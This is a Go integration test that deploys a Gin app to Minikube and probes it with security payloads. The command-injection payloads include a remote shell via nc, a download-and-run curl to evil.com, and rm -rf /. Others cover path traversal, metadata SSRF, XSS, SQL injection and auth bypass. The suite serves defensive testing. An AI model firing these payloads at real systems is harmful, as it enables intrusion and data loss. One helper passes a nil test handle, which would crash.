//go:build integration

package service_test

import (
	"context"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	appsv1 "k8s.io/api/apps/v1"
	corev1 "k8s.io/api/core/v1"
	netv1 "k8s.io/api/networking/v1"
	"k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/util/intstr"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/clientcmd"
	"k8s.io/client-go/util/homedir"
)

// 测试配置常量

const (
	testNamespace  = "kestrel-test"
	ginImage       = "gin-app:latest"
	appName        = "gin-test-app"
	appPort        = 8080
	appLabel       = "app"
	appLabelValue  = "gin-test-app"
	ingressName    = "gin-test-ingress"
	ingressHost    = "gin-test.local"
	healthPath     = "/health"
	readyPath      = "/ready"
	replicaCount   = int32(2)
	rolloutTimeout = 120 * time.Second
	healthInterval = 2 * time.Second
)

// SecurityFinding 安全控测试结果。
type SecurityFinding struct {
	ID          string // 测试用例标识
	Category    string // 攻击类别（路径穿越、命令注入等）
	Description string // 测试描述
	Payload     string // 使用的攻击载荷
	Expected    string // 预期行为（应用应当拒绝或过滤）
	Actual      string // 实际响应
	Status      string // PASS / FAIL / WARN
	Severity    string // 高 / 中 / 低 / 信息
}

// TestReport 测试报告。
type TestReport struct {
	mu       sync.Mutex
	findings []SecurityFinding
}

func (r *TestReport) add(f SecurityFinding) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.findings = append(r.findings, f)
}

func (r *TestReport) print() {
	passed, failed, warned := 0, 0, 0

	fmt.Println()
	fmt.Println("═══════════════════════════════════════════════════════")
	fmt.Println("                  安全评估报告")
	fmt.Println("═══════════════════════════════════════════════════════")

	for _, f := range r.findings {
		icon := "✅"
		switch f.Status {
		case "FAIL":
			icon = "❌"
			failed++
		case "WARN":
			icon = "⚠️"
			warned++
		default:
			passed++
		}

		fmt.Printf("\n%s [%s] %s\n", icon, f.Severity, f.ID)
		fmt.Printf("  类别:     %s\n", f.Category)
		fmt.Printf("  描述:     %s\n", f.Description)
		fmt.Printf("  载荷:     %s\n", f.Payload)
		fmt.Printf("  预期:     %s\n", f.Expected)
		fmt.Printf("  实际:     %s\n", f.Actual)
		fmt.Printf("  结果:     %s\n", f.Status)
	}

	fmt.Println()
	fmt.Println("═══════════════════════════════════════════════════════")
	fmt.Printf("总计: %d  通过: %d  失败: %d  警告: %d\n",
		len(r.findings), passed, failed, warned)
	fmt.Println("═══════════════════════════════════════════════════════")

	if failed > 0 {
		fmt.Printf("\n❌ %d 项安全测试失败，请检查上述报告。\n", failed)
	} else {
		fmt.Println("\n✅ 所有安全测试通过。")
	}
}

// Kubernetes 客户端

// kubeClient 封装 Kubernetes 客户端连接。
type kubeClient struct {
	clientset *kubernetes.Clientset
}

func newKubeClient(t *testing.T) *kubeClient {
	t.Helper()

	home := homedir.HomeDir()
	if home == "" {
		t.Fatal("无法获取用户主目录")
	}

	kubeconfig := filepath.Join(home, ".kube", "config")
	if env := os.Getenv("KUBECONFIG"); env != "" {
		kubeconfig = env
	}

	config, err := clientcmd.BuildConfigFromFlags("", kubeconfig)
	if err != nil {
		t.Fatalf("构建 kubeconfig 失败: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		t.Fatalf("创建 clientset 失败: %v", err)
	}

	return &kubeClient{clientset: clientset}
}

// ensureNamespace 确保测试命名空间存在。
func (k *kubeClient) ensureNamespace(ctx context.Context, t *testing.T) {
	t.Helper()

	_, err := k.clientset.CoreV1().Namespaces().Get(ctx, testNamespace, metav1.GetOptions{})
	if err == nil {
		t.Logf("命名空间 %s 已存在", testNamespace)
		return
	}

	if !errors.IsNotFound(err) {
		t.Fatalf("查询命名空间失败: %v", err)
	}

	t.Logf("创建命名空间 %s", testNamespace)
	ns := &corev1.Namespace{
		ObjectMeta: metav1.ObjectMeta{
			Name: testNamespace,
			Labels: map[string]string{
				"app.kubernetes.io/name":       "kestrel-test",
				"app.kubernetes.io/managed-by": "kestrel-test-suite",
			},
		},
	}

	if _, err := k.clientset.CoreV1().Namespaces().Create(ctx, ns, metav1.CreateOptions{}); err != nil {
		t.Fatalf("创建命名空间失败: %v", err)
	}
}

// deleteNamespace 删除测试命名空间（级联清理所有资源）。
func (k *kubeClient) deleteNamespace(ctx context.Context, t *testing.T) {
	t.Helper()

	t.Logf("删除命名空间 %s", testNamespace)
	err := k.clientset.CoreV1().Namespaces().Delete(ctx, testNamespace, metav1.DeleteOptions{})
	if err != nil && !errors.IsNotFound(err) {
		t.Logf("删除命名空间失败: %v", err)
		return
	}

	// 等待命名空间完全删除。
	for i := 0; i < 30; i++ {
		_, err := k.clientset.CoreV1().Namespaces().Get(ctx, testNamespace, metav1.GetOptions{})
		if errors.IsNotFound(err) {
			t.Logf("命名空间 %s 已清除", testNamespace)
			return
		}
		time.Sleep(time.Second)
	}
	t.Logf("命名空间 %s 删除超时，可能需要手动清理", testNamespace)
}

// deployGinApp 部署 Gin 应用 Deployment + Service + Ingress。
func (k *kubeClient) deployGinApp(ctx context.Context, t *testing.T) {
	t.Helper()

	k.createDeployment(ctx, t)
	k.createService(ctx, t)
	k.createIngress(ctx, t)
}

// createDeployment 创建 Gin 应用 Deployment。
func (k *kubeClient) createDeployment(ctx context.Context, t *testing.T) {
	t.Helper()

	replicas := replicaCount
	dep := &appsv1.Deployment{
		ObjectMeta: metav1.ObjectMeta{
			Name:      appName,
			Namespace: testNamespace,
			Labels:    map[string]string{appLabel: appLabelValue},
		},
		Spec: appsv1.DeploymentSpec{
			Replicas: &replicas,
			Selector: &metav1.LabelSelector{
				MatchLabels: map[string]string{appLabel: appLabelValue},
			},
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{
					Labels: map[string]string{appLabel: appLabelValue},
				},
				Spec: corev1.PodSpec{
					Containers: []corev1.Container{
						{
							Name:  appName,
							Image: ginImage,
							Ports: []corev1.ContainerPort{
								{ContainerPort: appPort, Protocol: corev1.ProtocolTCP},
							},
							Env: []corev1.EnvVar{
								{Name: "GIN_MODE", Value: "release"},
							},
							ReadinessProbe: &corev1.Probe{
								ProbeHandler: corev1.ProbeHandler{
									HTTPGet: &corev1.HTTPGetAction{
										Path:   readyPath,
										Port:   intstr.FromInt(appPort),
										Scheme: corev1.URISchemeHTTP,
									},
								},
								InitialDelaySeconds: 5,
								PeriodSeconds:       5,
								FailureThreshold:    3,
							},
							LivenessProbe: &corev1.Probe{
								ProbeHandler: corev1.ProbeHandler{
									HTTPGet: &corev1.HTTPGetAction{
										Path:   healthPath,
										Port:   intstr.FromInt(appPort),
										Scheme: corev1.URISchemeHTTP,
									},
								},
								InitialDelaySeconds: 10,
								PeriodSeconds:       10,
								FailureThreshold:    3,
							},
							Resources: corev1.ResourceRequirements{
								Limits: corev1.ResourceList{
									corev1.ResourceCPU:    resourceQuantity("500m"),
									corev1.ResourceMemory: resourceQuantity("128Mi"),
								},
								Requests: corev1.ResourceList{
									corev1.ResourceCPU:    resourceQuantity("100m"),
									corev1.ResourceMemory: resourceQuantity("64Mi"),
								},
							},
							SecurityContext: &corev1.SecurityContext{
								RunAsNonRoot:             boolPtr(true),
								RunAsUser:                int64Ptr(1000),
								ReadOnlyRootFilesystem:   boolPtr(true),
								AllowPrivilegeEscalation: boolPtr(false),
							},
						},
					},
				},
			},
		},
	}

	t.Logf("创建 Deployment %s/%s", testNamespace, appName)
	if _, err := k.clientset.AppsV1().Deployments(testNamespace).Create(ctx, dep, metav1.CreateOptions{}); err != nil {
		if errors.IsAlreadyExists(err) {
			t.Logf("Deployment 已存在，更新中...")
			if _, err := k.clientset.AppsV1().Deployments(testNamespace).Update(ctx, dep, metav1.UpdateOptions{}); err != nil {
				t.Fatalf("更新 Deployment 失败: %v", err)
			}
		} else {
			t.Fatalf("创建 Deployment 失败: %v", err)
		}
	}
}

// createService 创建 ClusterIP Service。
func (k *kubeClient) createService(ctx context.Context, t *testing.T) {
	t.Helper()

	svc := &corev1.Service{
		ObjectMeta: metav1.ObjectMeta{
			Name:      appName,
			Namespace: testNamespace,
			Labels:    map[string]string{appLabel: appLabelValue},
		},
		Spec: corev1.ServiceSpec{
			Type:     corev1.ServiceTypeNodePort,
			Selector: map[string]string{appLabel: appLabelValue},
			Ports: []corev1.ServicePort{
				{
					Port:       appPort,
					TargetPort: intstr.FromInt(appPort),
					Protocol:   corev1.ProtocolTCP,
				},
			},
		},
	}

	t.Logf("创建 Service %s/%s", testNamespace, appName)
	if _, err := k.clientset.CoreV1().Services(testNamespace).Create(ctx, svc, metav1.CreateOptions{}); err != nil {
		if errors.IsAlreadyExists(err) {
			t.Logf("Service 已存在，跳过创建")
		} else {
			t.Fatalf("创建 Service 失败: %v", err)
		}
	}
}

// createIngress 创建 Ingress 路由。
func (k *kubeClient) createIngress(ctx context.Context, t *testing.T) {
	t.Helper()

	pathType := netv1.PathTypePrefix
	ing := &netv1.Ingress{
		ObjectMeta: metav1.ObjectMeta{
			Name:      ingressName,
			Namespace: testNamespace,
			Labels:    map[string]string{appLabel: appLabelValue},
			Annotations: map[string]string{
				"nginx.ingress.kubernetes.io/rewrite-target": "/",
			},
		},
		Spec: netv1.IngressSpec{
			Rules: []netv1.IngressRule{
				{
					Host: ingressHost,
					IngressRuleValue: netv1.IngressRuleValue{
						HTTP: &netv1.HTTPIngressRuleValue{
							Paths: []netv1.HTTPIngressPath{
								{
									Path:     "/",
									PathType: &pathType,
									Backend: netv1.IngressBackend{
										Service: &netv1.IngressServiceBackend{
											Name: appName,
											Port: netv1.ServiceBackendPort{
												Number: appPort,
											},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	t.Logf("创建 Ingress %s/%s", testNamespace, ingressName)
	if _, err := k.clientset.NetworkingV1().Ingresses(testNamespace).Create(ctx, ing, metav1.CreateOptions{}); err != nil {
		if errors.IsAlreadyExists(err) {
			t.Logf("Ingress 已存在，跳过创建")
		} else {
			t.Logf("创建 Ingress 失败（Minikube ingress 插件可能未启用）: %v", err)
		}
	}
}

// waitForRollout 等待 Deployment 所有 Pod 就绪。
func (k *kubeClient) waitForRollout(ctx context.Context, t *testing.T) {
	t.Helper()

	t.Logf("等待 Deployment 滚动更新完成（超时 %v）", rolloutTimeout)

	deadline := time.Now().Add(rolloutTimeout)
	for time.Now().Before(deadline) {
		dep, err := k.clientset.AppsV1().Deployments(testNamespace).Get(ctx, appName, metav1.GetOptions{})
		if err != nil {
			t.Fatalf("查询 Deployment 失败: %v", err)
		}

		if dep.Status.ReadyReplicas == *dep.Spec.Replicas && dep.Status.UnavailableReplicas == 0 {
			t.Logf("Deployment 就绪: %d/%d Pod 就绪", dep.Status.ReadyReplicas, *dep.Spec.Replicas)
			return
		}

		t.Logf("等待中: %d/%d Pod 就绪...", dep.Status.ReadyReplicas, *dep.Spec.Replicas)
		time.Sleep(healthInterval)
	}

	t.Fatalf("Deployment 滚动更新超时")
}

// getServiceNodePort 获取 Service 的 NodePort。
func (k *kubeClient) getServiceNodePort(ctx context.Context, t *testing.T) int32 {
	t.Helper()

	svc, err := k.clientset.CoreV1().Services(testNamespace).Get(ctx, appName, metav1.GetOptions{})
	if err != nil {
		t.Fatalf("查询 Service 失败: %v", err)
	}

	for _, port := range svc.Spec.Ports {
		if port.NodePort != 0 {
			return port.NodePort
		}
	}

	t.Fatal("Service 没有 NodePort")
	return 0
}

// getMinikubeIP 获取 Minikube 节点 IP。
func getMinikubeIP(t *testing.T) string {
	t.Helper()

	// 优先从环境变量获取。
	if ip := os.Getenv("MINIKUBE_IP"); ip != "" {
		return ip
	}

	// 尝试从 minikube 命令获取。
	// 测试环境直接硬编码 Minikube 默认 IP。
	return "192.168.49.2"
}

// getAppBaseURL 构建应用访问地址。
func getAppBaseURL(nodePort int32) string {
	return fmt.Sprintf("http://%s:%d", getMinikubeIP(nil), nodePort)
}

// 健康检查

// waitForHealth 持续轮询健康检查端点直到成功或超时。
func waitForHealth(baseURL string, t *testing.T) {
	t.Helper()

	healthURL := baseURL + healthPath
	t.Logf("等待健康检查端点就绪: %s", healthURL)

	client := &http.Client{Timeout: 5 * time.Second}
	deadline := time.Now().Add(rolloutTimeout)

	for time.Now().Before(deadline) {
		resp, err := client.Get(healthURL)
		if err == nil && resp.StatusCode == http.StatusOK {
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			t.Logf("健康检查通过: %d - %s", resp.StatusCode, strings.TrimSpace(string(body)))
			return
		}
		if resp != nil {
			resp.Body.Close()
		}
		time.Sleep(healthInterval)
	}

	t.Fatalf("健康检查超时: %s", healthURL)
}

// validateEndpoints 验证应用所有端点是否正常响应。
func validateEndpoints(baseURL string, t *testing.T) {
	t.Helper()

	endpoints := []struct {
		path       string
		method     string
		expectCode int
	}{
		{healthPath, http.MethodGet, http.StatusOK},
		{readyPath, http.MethodGet, http.StatusOK},
		{"/", http.MethodGet, http.StatusOK},
		{"/api/v1/status", http.MethodGet, http.StatusOK},
	}

	client := &http.Client{Timeout: 5 * time.Second}

	for _, ep := range endpoints {
		t.Run("endpoint_"+ep.path, func(t *testing.T) {
			url := baseURL + ep.path
			req, err := http.NewRequest(ep.method, url, nil)
			if err != nil {
				t.Fatalf("构造请求失败: %v", err)
			}

			resp, err := client.Do(req)
			if err != nil {
				t.Fatalf("请求 %s 失败: %v", url, err)
			}
			defer resp.Body.Close()

			if resp.StatusCode != ep.expectCode {
				t.Errorf("端点 %s: 预期 %d，实际 %d", ep.path, ep.expectCode, resp.StatusCode)
			} else {
				t.Logf("端点 %s: %d ✅", ep.path, resp.StatusCode)
			}
		})
	}
}

// 安全测试

// runSecurityTests 执行全部安全测试。
func runSecurityTests(baseURL string, t *testing.T) *TestReport {
	t.Helper()

	report := &TestReport{}
	client := &http.Client{Timeout: 10 * time.Second}

	// 安全测试套件
	tests := []func(baseURL string, client *http.Client, report *TestReport){
		testPathTraversal,
		testCommandInjection,
		testSSRF,
		testXSS,
		testSQLInjection,
		testAuthBypass,
		testOpenRedirect,
		testDirectoryListing,
		testHTTPMethodTampering,
		testSecurityHeaders,
		testHTTPMethodPollution,
		testHostHeaderInjection,
	}

	for _, tt := range tests {
		tt(baseURL, client, report)
	}

	return report
}

// testPathTraversal 测试路径穿越攻击。
func testPathTraversal(baseURL string, client *http.Client, report *TestReport) {
	payloads := []string{
		"/../../../etc/passwd",
		"/..%2f..%2f..%2fetc%2fpasswd",
		"/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"/....//....//....//etc/passwd",
		"/api/v1/files/../../../../etc/shadow",
	}

	for i, payload := range payloads {
		encoded := url.PathEscape(payload)
		reqURL := baseURL + encoded

		resp, err := client.Get(reqURL)
		if err != nil {
			report.add(SecurityFinding{
				ID:          fmt.Sprintf("PATH-TRAVERSAL-%d", i+1),
				Category:    "路径穿越",
				Description: "尝试通过 ../ 序列访问系统敏感文件",
				Payload:     payload,
				Expected:    "应用应返回 403/404，不泄露文件内容",
				Actual:      fmt.Sprintf("请求失败: %v", err),
				Status:      "WARN",
				Severity:    "高",
			})
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)
		hasSensitive := strings.Contains(bodyStr, "root:") ||
			strings.Contains(bodyStr, "bin/bash") ||
			strings.Contains(bodyStr, "/bin/sh")

		status := "PASS"
		if hasSensitive {
			status = "FAIL"
		}

		actual := fmt.Sprintf("HTTP %d, body_len=%d", resp.StatusCode, len(body))
		if hasSensitive {
			actual += " [检测到敏感文件内容!]"
		}

		report.add(SecurityFinding{
			ID:          fmt.Sprintf("PATH-TRAVERSAL-%d", i+1),
			Category:    "路径穿越",
			Description: "尝试通过 ../ 序列访问系统敏感文件",
			Payload:     payload,
			Expected:    "应用应返回 403/404，不泄露文件内容",
			Actual:      actual,
			Status:      status,
			Severity:    "高",
		})
	}
}

// testCommandInjection 测试命令注入攻击。
func testCommandInjection(baseURL string, client *http.Client, report *TestReport) {
	payloads := map[string]string{
		"cmd_param":  "; cat /etc/passwd",
		"exec":       "$(whoami)",
		"input":      "| id",
		"query":      "`id`",
		"cmd":        "; curl http://evil.com | bash",
		"file":       "file.txt; rm -rf /",
		"name":       "test; nc -e /bin/sh 10.0.0.1 4444",
		"exec_param": "&& whoami &&",
	}

	for param, payload := range payloads {
		form := url.Values{}
		form.Set(param, payload)

		resp, err := client.PostForm(baseURL+"/api/v1/exec", form)
		if err != nil {
			report.add(SecurityFinding{
				ID:          fmt.Sprintf("CMD-INJECTION-%s", param),
				Category:    "命令注入",
				Description: "尝试通过参数注入 Shell 命令",
				Payload:     fmt.Sprintf("%s=%s", param, payload),
				Expected:    "应用应拒绝执行，返回 400/403",
				Actual:      fmt.Sprintf("请求失败: %v", err),
				Status:      "WARN",
				Severity:    "高",
			})
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)
		hasEvidence := strings.Contains(bodyStr, "uid=") ||
			strings.Contains(bodyStr, "root") ||
			strings.Contains(bodyStr, "www-data")

		status := "PASS"
		if hasEvidence {
			status = "FAIL"
		}

		actual := fmt.Sprintf("HTTP %d, body_len=%d", resp.StatusCode, len(body))
		if hasEvidence {
			actual += " [检测到命令执行输出!]"
		}

		report.add(SecurityFinding{
			ID:          fmt.Sprintf("CMD-INJECTION-%s", param),
			Category:    "命令注入",
			Description: "尝试通过参数注入 Shell 命令",
			Payload:     fmt.Sprintf("%s=%s", param, payload),
			Expected:    "应用应拒绝执行，返回 400/403",
			Actual:      actual,
			Status:      status,
			Severity:    "高",
		})
	}
}

// testSSRF 测试 SSRF（服务端请求伪造）攻击。
func testSSRF(baseURL string, client *http.Client, report *TestReport) {
	payloads := []string{
		"http://169.254.169.254/latest/meta-data/",
		"http://169.254.169.254/computeMetadata/v1/",
		"http://localhost:8080/admin",
		"http://127.0.0.1:6379/",
		"http://[::1]:8080/",
		"http://0.0.0.0:8080/",
		"http://metadata.google.internal/computeMetadata/v1/",
		"gopher://127.0.0.1:6379/_FLUSHALL",
	}

	for i, payload := range payloads {
		form := url.Values{}
		form.Set("url", payload)

		resp, err := client.PostForm(baseURL+"/api/v1/fetch", form)
		if err != nil {
			report.add(SecurityFinding{
				ID:          fmt.Sprintf("SSRF-%d", i+1),
				Category:    "SSRF",
				Description: "尝试通过 URL 参数访问内部/元数据服务",
				Payload:     payload,
				Expected:    "应用应拒绝内部 IP/元数据端点",
				Actual:      fmt.Sprintf("请求失败: %v", err),
				Status:      "WARN",
				Severity:    "高",
			})
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)
		hasMetadata := strings.Contains(bodyStr, "ami-id") ||
			strings.Contains(bodyStr, "instance-id") ||
			strings.Contains(bodyStr, "security-credentials") ||
			strings.Contains(bodyStr, "computeMetadata")

		status := "PASS"
		if hasMetadata {
			status = "FAIL"
		}

		actual := fmt.Sprintf("HTTP %d, body_len=%d", resp.StatusCode, len(body))
		if hasMetadata {
			actual += " [检测到元数据泄露!]"
		}

		report.add(SecurityFinding{
			ID:          fmt.Sprintf("SSRF-%d", i+1),
			Category:    "SSRF",
			Description: "尝试通过 URL 参数访问内部/元数据服务",
			Payload:     payload,
			Expected:    "应用应拒绝内部 IP/元数据端点",
			Actual:      actual,
			Status:      status,
			Severity:    "高",
		})
	}
}

// testXSS 测试跨站脚本攻击。
func testXSS(baseURL string, client *http.Client, report *TestReport) {
	payloads := []string{
		`<script>alert('XSS')</script>`,
		`<img src=x onerror=alert('XSS')>`,
		`"><script>alert(1)</script>`,
		`javascript:alert('XSS')`,
		`<svg/onload=alert('XSS')>`,
		`<iframe src="javascript:alert('XSS')">`,
	}

	for i, payload := range payloads {
		form := url.Values{}
		form.Set("input", payload)

		resp, err := client.PostForm(baseURL+"/api/v1/echo", form)
		if err != nil {
			report.add(SecurityFinding{
				ID:          fmt.Sprintf("XSS-%d", i+1),
				Category:    "跨站脚本",
				Description: "尝试注入恶意 JavaScript 脚本",
				Payload:     payload,
				Expected:    "应用应转义 HTML 特殊字符",
				Actual:      fmt.Sprintf("请求失败: %v", err),
				Status:      "WARN",
				Severity:    "中",
			})
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)
		hasUnescaped := strings.Contains(bodyStr, "<script>") ||
			strings.Contains(bodyStr, "onerror=") ||
			strings.Contains(bodyStr, "javascript:alert")

		status := "PASS"
		if hasUnescaped {
			status = "FAIL"
		}

		actual := fmt.Sprintf("HTTP %d, body_len=%d", resp.StatusCode, len(body))
		if hasUnescaped {
			actual += " [检测到未转义的脚本!]"
		}

		report.add(SecurityFinding{
			ID:          fmt.Sprintf("XSS-%d", i+1),
			Category:    "跨站脚本",
			Description: "尝试注入恶意 JavaScript 脚本",
			Payload:     payload,
			Expected:    "应用应转义 HTML 特殊字符",
			Actual:      actual,
			Status:      status,
			Severity:    "中",
		})
	}
}

// testSQLInjection 测试 SQL 注入攻击。
func testSQLInjection(baseURL string, client *http.Client, report *TestReport) {
	payloads := map[string]string{
		"username": `' OR '1'='1`,
		"id":       `1; DROP TABLE users--`,
		"name":     `' UNION SELECT * FROM users--`,
		"email":    `admin'--`,
		"search":   `' OR 1=1#`,
		"q":        `'; EXEC xp_cmdshell('dir')--`,
	}

	for param, payload := range payloads {
		form := url.Values{}
		form.Set(param, payload)

		resp, err := client.PostForm(baseURL+"/api/v1/query", form)
		if err != nil {
			report.add(SecurityFinding{
				ID:          fmt.Sprintf("SQL-INJECTION-%s", param),
				Category:    "SQL 注入",
				Description: "尝试通过参数注入 SQL 语句",
				Payload:     fmt.Sprintf("%s=%s", param, payload),
				Expected:    "应用应使用参数化查询，拒绝注入",
				Actual:      fmt.Sprintf("请求失败: %v", err),
				Status:      "WARN",
				Severity:    "高",
			})
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)
		hasSQLError := strings.Contains(bodyStr, "SQL") ||
			strings.Contains(bodyStr, "syntax error") ||
			strings.Contains(bodyStr, "mysql") ||
			strings.Contains(bodyStr, "sqlite") ||
			strings.Contains(bodyStr, "ORA-")

		status := "PASS"
		if hasSQLError {
			status = "FAIL"
		}

		actual := fmt.Sprintf("HTTP %d, body_len=%d", resp.StatusCode, len(body))
		if hasSQLError {
			actual += " [检测到数据库错误泄露!]"
		}

		report.add(SecurityFinding{
			ID:          fmt.Sprintf("SQL-INJECTION-%s", param),
			Category:    "SQL 注入",
			Description: "尝试通过参数注入 SQL 语句",
			Payload:     fmt.Sprintf("%s=%s", param, payload),
			Expected:    "应用应使用参数化查询，拒绝注入",
			Actual:      actual,
			Status:      status,
			Severity:    "高",
		})
	}
}

// testAuthBypass 测试认证绕过攻击。
func testAuthBypass(baseURL string, client *http.Client, report *TestReport) {
	tests := []struct {
		path    string
		method  string
		headers map[string]string
	}{
		{"/api/v1/admin", http.MethodGet, nil},
		{"/api/v1/admin/users", http.MethodGet, nil},
		{"/admin", http.MethodGet, nil},
		{"/api/v1/admin", http.MethodGet, map[string]string{"X-Forwarded-For": "127.0.0.1"}},
		{"/api/v1/admin", http.MethodGet, map[string]string{"X-Original-URL": "/admin"}},
		{"/api/v1/admin", http.MethodGet, map[string]string{"X-Rewrite-URL": "/admin"}},
		{"/api/v1/admin", http.MethodGet, map[string]string{"Authorization": "Bearer admin"}},
		{"/api/v1/admin", http.MethodGet, map[string]string{"Cookie": "role=admin; isAdmin=true"}},
		{"/api/v1/admin/.;%2f..%2f", http.MethodGet, nil},
		{"/api/v1/admin", http.MethodGet, map[string]string{"X-Custom-IP-Authorization": "127.0.0.1"}},
	}

	for i, tt := range tests {
		reqURL := baseURL + tt.path
		req, err := http.NewRequest(tt.method, reqURL, nil)
		if err != nil {
			continue
		}

		for k, v := range tt.headers {
			req.Header.Set(k, v)
		}

		resp, err := client.Do(req)
		if err != nil {
			report.add(SecurityFinding{
				ID:          fmt.Sprintf("AUTH-BYPASS-%d", i+1),
				Category:    "认证绕过",
				Description: "尝试通过请求头/路径绕过认证",
				Payload:     fmt.Sprintf("%s %s headers=%v", tt.method, tt.path, tt.headers),
				Expected:    "应用应返回 401/403",
				Actual:      fmt.Sprintf("请求失败: %v", err),
				Status:      "WARN",
				Severity:    "高",
			})
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		status := "PASS"
		if resp.StatusCode == http.StatusOK {
			status = "FAIL"
		}

		actual := fmt.Sprintf("HTTP %d, body_len=%d", resp.StatusCode, len(body))

		report.add(SecurityFinding{
			ID:          fmt.Sprintf("AUTH-BYPASS-%d", i+1),
			Category:    "认证绕过",
			Description: "尝试通过请求头/路径绕过认证",
			Payload:     fmt.Sprintf("%s %s headers=%v", tt.method, tt.path, tt.headers),
			Expected:    "应用应返回 401/403",
			Actual:      actual,
			Status:      status,
			Severity:    "高",
		})
	}
}

// testOpenRedirect 测试开放重定向攻击。
func testOpenRedirect(baseURL string, client *http.Client, report *TestReport) {
	payloads := []string{
		"https://evil.com",
		"//evil.com",
		"/\\evil.com",
		"https://evil.com@trusted.com",
		"javascript:alert(1)//",
	}

	for i, payload := range payloads {
		form := url.Values{}
		form.Set("redirect", payload)

		resp, err := client.PostForm(baseURL+"/api/v1/redirect", form)
		if err != nil {
			report.add(SecurityFinding{
				ID:          fmt.Sprintf("OPEN-REDIRECT-%d", i+1),
				Category:    "开放重定向",
				Description: "尝试利用重定向参数跳转到恶意站点",
				Payload:     payload,
				Expected:    "应用应拒绝外部域名重定向",
				Actual:      fmt.Sprintf("请求失败: %v", err),
				Status:      "WARN",
				Severity:    "中",
			})
			continue
		}
		resp.Body.Close()

		location := resp.Header.Get("Location")
		status := "PASS"
		if strings.Contains(location, "evil.com") {
			status = "FAIL"
		}

		actual := fmt.Sprintf("HTTP %d, Location=%s", resp.StatusCode, location)

		report.add(SecurityFinding{
			ID:          fmt.Sprintf("OPEN-REDIRECT-%d", i+1),
			Category:    "开放重定向",
			Description: "尝试利用重定向参数跳转到恶意站点",
			Payload:     payload,
			Expected:    "应用应拒绝外部域名重定向",
			Actual:      actual,
			Status:      status,
			Severity:    "中",
		})
	}
}

// testDirectoryListing 测试目录列表暴露。
func testDirectoryListing(baseURL string, client *http.Client, report *TestReport) {
	paths := []string{
		"/static/",
		"/uploads/",
		"/files/",
		"/assets/",
		"/.git/",
		"/.env",
		"/backup/",
		"/config/",
	}

	for i, path := range paths {
		resp, err := client.Get(baseURL + path)
		if err != nil {
			report.add(SecurityFinding{
				ID:          fmt.Sprintf("DIR-LISTING-%d", i+1),
				Category:    "目录列表",
				Description: "尝试访问目录或敏感文件",
				Payload:     path,
				Expected:    "应用应返回 403/404",
				Actual:      fmt.Sprintf("请求失败: %v", err),
				Status:      "WARN",
				Severity:    "中",
			})
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)
		hasListing := strings.Contains(bodyStr, "Index of") ||
			strings.Contains(bodyStr, "Directory listing") ||
			strings.Contains(bodyStr, "Parent Directory")

		hasSecrets := strings.Contains(bodyStr, "DATABASE_URL") ||
			strings.Contains(bodyStr, "SECRET_KEY") ||
			strings.Contains(bodyStr, "API_KEY") ||
			strings.Contains(bodyStr, "[core]")

		status := "PASS"
		if hasListing || hasSecrets {
			status = "FAIL"
		}

		actual := fmt.Sprintf("HTTP %d, body_len=%d", resp.StatusCode, len(body))
		if hasListing {
			actual += " [检测到目录列表!]"
		}
		if hasSecrets {
			actual += " [检测到敏感配置泄露!]"
		}

		report.add(SecurityFinding{
			ID:          fmt.Sprintf("DIR-LISTING-%d", i+1),
			Category:    "目录列表",
			Description: "尝试访问目录或敏感文件",
			Payload:     path,
			Expected:    "应用应返回 403/404",
			Actual:      actual,
			Status:      status,
			Severity:    "中",
		})
	}
}

// testHTTPMethodTampering 测试 HTTP 方法篡改。
func testHTTPMethodTampering(baseURL string, client *http.Client, report *TestReport) {
	methods := []string{
		http.MethodPut,
		http.MethodDelete,
		http.MethodPatch,
		http.MethodTrace,
		http.MethodOptions,
		"PROPFIND",
		"CONNECT",
		"COPY",
		"MOVE",
	}

	path := "/api/v1/data"

	for i, method := range methods {
		req, err := http.NewRequest(method, baseURL+path, nil)
		if err != nil {
			continue
		}

		resp, err := client.Do(req)
		if err != nil {
			report.add(SecurityFinding{
				ID:          fmt.Sprintf("METHOD-TAMPER-%d", i+1),
				Category:    "HTTP 方法篡改",
				Description: "尝试使用非标准方法访问端点",
				Payload:     fmt.Sprintf("%s %s", method, path),
				Expected:    "应用应返回 405 Method Not Allowed",
				Actual:      fmt.Sprintf("请求失败: %v", err),
				Status:      "WARN",
				Severity:    "低",
			})
			continue
		}
		resp.Body.Close()

		status := "PASS"
		if resp.StatusCode == http.StatusOK {
			status = "WARN"
		}

		report.add(SecurityFinding{
			ID:          fmt.Sprintf("METHOD-TAMPER-%d", i+1),
			Category:    "HTTP 方法篡改",
			Description: "尝试使用非标准方法访问端点",
			Payload:     fmt.Sprintf("%s %s", method, path),
			Expected:    "应用应返回 405 Method Not Allowed",
			Actual:      fmt.Sprintf("HTTP %d", resp.StatusCode),
			Status:      status,
			Severity:    "低",
		})
	}
}

// testSecurityHeaders 检查安全响应头。
func testSecurityHeaders(baseURL string, client *http.Client, report *TestReport) {
	requiredHeaders := map[string]string{
		"X-Content-Type-Options":    "nosniff",
		"X-Frame-Options":           "DENY",
		"X-XSS-Protection":          "1; mode=block",
		"Strict-Transport-Security": "max-age=31536000",
		"Content-Security-Policy":   "default-src 'self'",
		"Referrer-Policy":           "strict-origin-when-cross-origin",
	}

